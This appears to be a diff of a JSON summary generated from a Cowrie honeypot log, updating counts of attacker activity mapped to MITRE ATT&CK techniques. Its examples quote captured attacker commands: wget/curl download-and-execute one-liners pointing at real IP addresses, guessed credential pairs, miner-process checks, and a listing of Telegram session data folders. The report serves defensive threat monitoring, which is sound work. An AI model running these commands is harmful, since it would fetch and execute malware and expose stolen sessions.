@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-21 15:03:45",
+  "generated": "2026-08-21 16:01:45",
   "totals": {
-    "commands": 431,
-    "login_failed": 5788,
-    "login_success": 62,
-    "sessions": 4106
+    "commands": 455,
+    "login_failed": 6339,
+    "login_success": 68,
+    "sessions": 4632
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 5788,
+      "count": 6339,
       "examples": [
         "odoo / P@ssw0rd",
         "sh\\x00 / /bin/busybox UNSTABLE\\x00",
@@ -21,14 +21,14 @@
         "root / root123."
       ],
       "first": "2026-08-21T00:00:05.590428Z",
-      "last": "2026-08-21T15:03:34.539281Z",
-      "unique_ips": 66
+      "last": "2026-08-21T16:01:40.763596Z",
+      "unique_ips": 71
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 129,
+      "count": 130,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -37,14 +37,14 @@
         ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
       ],
       "first": "2026-08-21T01:04:57.795191Z",
-      "last": "2026-08-21T13:22:49.780157Z",
-      "unique_ips": 16
+      "last": "2026-08-21T15:21:45.405489Z",
+      "unique_ips": 17
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 74,
+      "count": 76,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -53,14 +53,14 @@
         "http://185.93.89.72/wget"
       ],
       "first": "2026-08-21T01:04:57.795191Z",
-      "last": "2026-08-21T13:22:50.771504Z",
-      "unique_ips": 16
+      "last": "2026-08-21T15:21:46.374653Z",
+      "unique_ips": 17
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 62,
+      "count": 68,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / xirtam",
@@ -69,14 +69,14 @@
         "root / root"
       ],
       "first": "2026-08-21T00:25:45.541215Z",
-      "last": "2026-08-21T15:01:16.362254Z",
-      "unique_ips": 51
+      "last": "2026-08-21T16:00:43.684404Z",
+      "unique_ips": 55
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 12,
+      "count": 15,
       "examples": [
         "uname -a",
         "uname -s -v -n -r -m",
@@ -85,8 +85,8 @@
         "grep processor /proc/cpuinfo|grep -v Duo|wc -l"
       ],
       "first": "2026-08-21T05:12:14.278101Z",
-      "last": "2026-08-21T14:15:56.446860Z",
-      "unique_ips": 11
+      "last": "2026-08-21T15:54:36.567949Z",
+      "unique_ips": 13
     },
     {
       "id": "T1033",
@@ -131,21 +131,47 @@
       "unique_ips": 2
     },
     {
-      "id": "T1037",
-      "name": "Boot or Logon Initialization Scripts",
-      "tactic": "Persistence",
-      "count": 1,
+      "id": "T1057",
+      "name": "Process Discovery",
+      "tactic": "Discovery",
+      "count": 2,
       "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'"
       ],
-      "first": "2026-08-21T06:49:33.351090Z",
-      "last": "2026-08-21T06:49:33.351090Z",
+      "first": "2026-08-21T15:54:37.255897Z",
+      "last": "2026-08-21T15:54:37.939901Z",
       "unique_ips": 1
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
+      "count": 2,
+      "examples": [
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
+      ],
+      "first": "2026-08-21T06:49:33.351090Z",
+      "last": "2026-08-21T15:54:38.628013Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1016",
+      "name": "System Network Configuration Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "ifconfig"
+      ],
+      "first": "2026-08-21T15:54:35.210827Z",
+      "last": "2026-08-21T15:54:35.210827Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1037",
+      "name": "Boot or Logon Initialization Scripts",
+      "tactic": "Persistence",
       "count": 1,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
@@ -210,23 +236,23 @@
     ],
     [
       "sh",
-      27
+      29
     ],
     [
       "system",
-      23
+      25
     ],
     [
       "shell",
-      23
+      25
     ],
     [
       "enable",
-      23
+      25
     ],
     [
       "linuxshell",
-      18
+      19
     ],
     [
       "cd /proc && cat self/cmdline",
@@ -245,28 +271,28 @@
       12
     ],
     [
+      "/bin/busybox UNSTABLE",
+      7
+    ],
+    [
       "busybox",
       7
     ],
     [
-      "/bin/busybox UNSTABLE",
-      6
+      "ping; sh",
+      4
+    ],
+    [
+      "/bin/busybox STC",
+      4
+    ],
+    [
+      "/bin/busybox hostname TOASTER",
+      4
     ],
     [
       "shel",
       4
-    ],
-    [
-      "ping; sh",
-      3
-    ],
-    [
-      "/bin/busybox STC",
-      3
-    ],
-    [
-      "/bin/busybox hostname TOASTER",
-      3
     ],
     [
       "exit",
